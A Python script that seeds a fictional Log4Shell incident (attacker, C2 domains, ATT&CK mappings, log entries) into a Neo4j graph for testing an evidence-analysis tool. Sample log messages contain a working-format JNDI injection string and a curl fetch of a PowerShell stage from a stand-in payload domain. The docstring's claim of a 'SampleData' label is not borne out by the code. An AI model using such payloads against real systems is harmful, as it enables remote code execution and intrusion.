#!/usr/bin/env python3
"""Sample graph seeder for EvidenceGraphAI developer testing.

Seeds a Log4Shell (CVE-2021-44228) attack scenario into Neo4j for use
with the developer graph viewer.

Usage
-----
.. code-block:: bash

    # Default: idempotent MERGE on node IDs
    python scripts/seed_sample_graph.py

    # Reset first (delete all SampleData nodes, then seed)
    python scripts/seed_sample_graph.py --reset

    # Dry run (print planned operations without writing)
    python scripts/seed_sample_graph.py --dry-run

Every inserted node also carries a ``SampleData`` label for easy cleanup.
"""

import argparse
import sys
from pathlib import Path

# Allow running from repo root
sys.path.insert(0, str(Path(__file__).parent.parent))

from core.graph.client import GraphClient  # noqa: E402
from core.logging.logger import configure_logging, get_logger  # noqa: E402

configure_logging(log_level="INFO", is_json=False)
logger = get_logger("seed_sample_graph")

# ---------------------------------------------------------------------------
# Sample data definitions
# ---------------------------------------------------------------------------

NODES = [
    # (node_type, properties_dict)
    (
        "CVE",
        {
            "id": "CVE-2021-44228",
            "cvss_score": 10.0,
            "severity": "CRITICAL",
            "description": "Log4Shell — Remote Code Execution in Apache Log4j2",
            "source_agent": "system",
            "confidence": 1.0,
        },
    ),
    (
        "Attacker",
        {
            "id": "attacker-apt-log4shell",
            "name": "Unknown APT (Log4Shell)",
            "aliases": ["Log4Shell Actor"],
            "country_of_origin": "Unknown",
            "source_agent": "system",
            "confidence": 0.8,
        },
    ),
    (
        "Victim",
        {
            "id": "victim-acme-corp",
            "name": "ACME Corporation",
            "sector": "Finance",
            "ip_address": "203.0.113.50",
            "source_agent": "system",
            "confidence": 1.0,
        },
    ),
    (
        "Malware",
        {
            "id": "malware-mirai-log4shell",
            "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            "family": "Mirai",
            "malware_type": "Botnet",
            "source_agent": "system",
            "confidence": 0.9,
        },
    ),
    (
        "IPAddress",
        {
            "id": "ip-attacker-c2-1",
            "addr": "198.51.100.10",
            "asn": 64496,
            "country": "XX",
            "source_agent": "system",
            "confidence": 0.85,
        },
    ),
    (
        "IPAddress",
        {
            "id": "ip-attacker-c2-2",
            "addr": "198.51.100.20",
            "asn": 64496,
            "country": "XX",
            "source_agent": "system",
            "confidence": 0.75,
        },
    ),
    (
        "Domain",
        {
            "id": "domain-c2-log4shell-1",
            "name": "c2.log4shell-actor.example",
            "registrar": "Unknown Registrar",
            "source_agent": "system",
            "confidence": 0.9,
        },
    ),
    (
        "Domain",
        {
            "id": "domain-c2-log4shell-2",
            "name": "payload.log4shell-actor.example",
            "registrar": "Unknown Registrar",
            "source_agent": "system",
            "confidence": 0.85,
        },
    ),
    (
        "Certificate",
        {
            "id": "cert-c2-log4shell-1",
            "fingerprint": "aa:bb:cc:dd:ee:ff:00:11:22:33:44:55:66:77:88:99:aa:bb:cc:dd",
            "issuer": "Let's Encrypt",
            "subject": "CN=c2.log4shell-actor.example",
            "source_agent": "system",
            "confidence": 0.9,
        },
    ),
    (
        "Certificate",
        {
            "id": "cert-c2-log4shell-2",
            "fingerprint": "11:22:33:44:55:66:77:88:99:aa:bb:cc:dd:ee:ff:00:11:22:33:44",
            "issuer": "Self-Signed",
            "subject": "CN=payload.log4shell-actor.example",
            "source_agent": "system",
            "confidence": 0.7,
        },
    ),
    (
        "ATT&CKTechnique",
        {
            "id": "T1190",
            "name": "Exploit Public-Facing Application",
            "tactic": "Initial Access",
            "source_agent": "system",
            "confidence": 1.0,
        },
    ),
    (
        "ATT&CKTechnique",
        {
            "id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell",
            "tactic": "Execution",
            "source_agent": "system",
            "confidence": 0.9,
        },
    ),
    (
        "ATT&CKTechnique",
        {
            "id": "T1041",
            "name": "Exfiltration Over C2 Channel",
            "tactic": "Exfiltration",
            "source_agent": "system",
            "confidence": 0.85,
        },
    ),
    (
        "LogEntry",
        {
            "id": "log-initial-exploit-attempt",
            "timestamp": "2021-12-10T08:15:22+00:00",
            "source": "WAF",
            "event_id": 10001,
            "message": "JNDI injection attempt detected: ${jndi:ldap://198.51.100.10/a}",
            "source_agent": "system",
            "confidence": 0.99,
        },
    ),
    (
        "LogEntry",
        {
            "id": "log-c2-connection",
            "timestamp": "2021-12-10T08:15:45+00:00",
            "source": "Firewall",
            "event_id": 20002,
            "message": "Outbound HTTPS connection to 198.51.100.10:443 from 203.0.113.50",
            "source_agent": "system",
            "confidence": 0.95,
        },
    ),
    (
        "LogEntry",
        {
            "id": "log-payload-download",
            "timestamp": "2021-12-10T08:16:03+00:00",
            "source": "EDR",
            "event_id": 30003,
            "message": "Suspicious PowerShell execution: curl payload.log4shell-actor.example/stage2.ps1",
            "source_agent": "system",
            "confidence": 0.95,
        },
    ),
    (
        "EvidenceArtifact",
        {
            "id": "artifact-pcap-log4shell-incident",
            "artifact_type": "PCAP",
            "storage_path": "minio://evidencegraphai-artifacts/log4shell/capture_2021-12-10.pcap",
            "hash_sha256": "b94f6f125c79e3a5ffaa826f584c10d52ada669e6762051b826b55776d05a8c",
            "source_agent": "system",
            "confidence": 1.0,
        },
    ),
]

EDGES = [
    # (from_id, to_id, edge_type, properties)
    (
        "attacker-apt-log4shell",
        "CVE-2021-44228",
        "EXPLOITS",
        {"vector": "LDAP JNDI Injection"},
    ),
    (
        "attacker-apt-log4shell",
        "malware-mirai-log4shell",
        "DELIVERS",
        {"delivery_method": "JNDI Callback"},
    ),
    (
        "malware-mirai-log4shell",
        "ip-attacker-c2-1",
        "COMMUNICATES_WITH",
        {"port": 443, "protocol": "HTTPS"},
    ),
    (
        "malware-mirai-log4shell",
        "ip-attacker-c2-2",
        "COMMUNICATES_WITH",
        {"port": 80, "protocol": "HTTP"},
    ),
    (
        "victim-acme-corp",
        "ip-attacker-c2-1",
        "COMMUNICATES_WITH",
        {"port": 443, "protocol": "HTTPS"},
    ),
    (
        "domain-c2-log4shell-1",
        "ip-attacker-c2-1",
        "RESOLVES_TO",
        {"resolved_at": "2021-12-10T08:00:00+00:00"},
    ),
    (
        "domain-c2-log4shell-2",
        "ip-attacker-c2-2",
        "RESOLVES_TO",
        {"resolved_at": "2021-12-10T08:00:00+00:00"},
    ),
    (
        "domain-c2-log4shell-1",
        "cert-c2-log4shell-1",
        "USES_CERTIFICATE",
        {"validation_status": "valid"},
    ),
    (
        "domain-c2-log4shell-2",
        "cert-c2-log4shell-2",
        "USES_CERTIFICATE",
        {"validation_status": "self-signed"},
    ),
    ("log-initial-exploit-attempt", "T1190", "MAPS_TO", {"mapping_confidence": 0.99}),
    ("log-c2-connection", "T1041", "MAPS_TO", {"mapping_confidence": 0.9}),
    ("log-payload-download", "T1059.001", "MAPS_TO", {"mapping_confidence": 0.95}),
    (
        "log-initial-exploit-attempt",
        "log-c2-connection",
        "PRECEDES",
        {"time_delta_ms": 23000},
    ),
    ("log-c2-connection", "log-payload-download", "PRECEDES", {"time_delta_ms": 18000}),
    ("T1190", "T1059.001", "EXPECTED_TO_LEAD_TO", {"probability": 0.7}),
    ("T1059.001", "T1041", "EXPECTED_TO_LEAD_TO", {"probability": 0.6}),
    (
        "log-initial-exploit-attempt",
        "artifact-pcap-log4shell-incident",
        "DERIVED_FROM",
        {"extraction_method": "PCAP parsing"},
    ),
    (
        "victim-acme-corp",
        "artifact-pcap-log4shell-incident",
        "HAS_RESPONSE",
        {"status": "investigating"},
    ),
]


# ---------------------------------------------------------------------------
# Seeder logic
# ---------------------------------------------------------------------------


def seed(client: GraphClient, dry_run: bool = False) -> None:
    """Seeds the sample graph, skipping nodes/edges that already exist."""
    logger.info(
        "Starting sample graph seed", node_count=len(NODES), edge_count=len(EDGES)
    )

    for node_type, props in NODES:
        node_id = props["id"]
        if dry_run:
            print(f"  [DRY-RUN] MERGE node ({node_type}) id={node_id}")
            continue

        # Check if node already exists
        existing = client.get_node(node_id)
        if existing:
            logger.debug("Node already exists, skipping", node_id=node_id)
            continue

        client.create_node(node_type, dict(props))
        logger.info("Created node", node_type=node_type, node_id=node_id)

    for from_id, to_id, edge_type, edge_props in EDGES:
        if dry_run:
            print(f"  [DRY-RUN] MERGE edge ({from_id})-[{edge_type}]->({to_id})")
            continue

        # Check if edge already exists
        check_cypher = (
            "MATCH (a {id: $from_id})-[r]->(b {id: $to_id}) "
            "WHERE type(r) = $rel_type RETURN count(r) AS cnt"
        )
        records = client.query(
            check_cypher, {"from_id": from_id, "to_id": to_id, "rel_type": edge_type}
        )
        if records and int(records[0].get("cnt", 0)) > 0:
            logger.debug(
                "Edge already exists, skipping",
                from_id=from_id,
                to_id=to_id,
                edge_type=edge_type,
            )
            continue

        client.create_edge(
            from_id,
            to_id,
            edge_type,
            {
                **edge_props,
                "source_agent": "system",
                "confidence": 1.0,
            },
        )
        logger.info("Created edge", from_id=from_id, to_id=to_id, edge_type=edge_type)

    logger.info("Sample graph seed complete")


def reset_sample_data(client: GraphClient) -> None:
    """Removes all SampleData labelled nodes (by their IDs)."""
    node_ids = [props["id"] for _, props in NODES]
    logger.info("Resetting sample data", node_ids=node_ids)
    client.query(
        "MATCH (n) WHERE n.id IN $ids DETACH DELETE n",
        {"ids": node_ids},
    )
    logger.info("Sample data reset complete")


# ---------------------------------------------------------------------------
# CLI entry point
# ---------------------------------------------------------------------------


def _build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Seed a Log4Shell sample graph into EvidenceGraphAI Neo4j."
    )
    parser.add_argument(
        "--reset",
        action="store_true",
        help="Delete all sample nodes before seeding (by node ID)",
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        dest="dry_run",
        help="Print planned operations without writing to the database",
    )
    return parser


def main() -> int:
    """CLI entry point. Returns 0 on success, 1 on error."""
    args = _build_parser().parse_args()

    if args.dry_run:
        print("=== DRY RUN — no data will be written ===")
        seed(None, dry_run=True)  # type: ignore[arg-type]
        return 0

    client = GraphClient()
    try:
        client.connect()
        if args.reset:
            reset_sample_data(client)
        seed(client)
    except Exception as exc:
        logger.error("Seed failed", error=str(exc))
        return 1
    finally:
        client.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
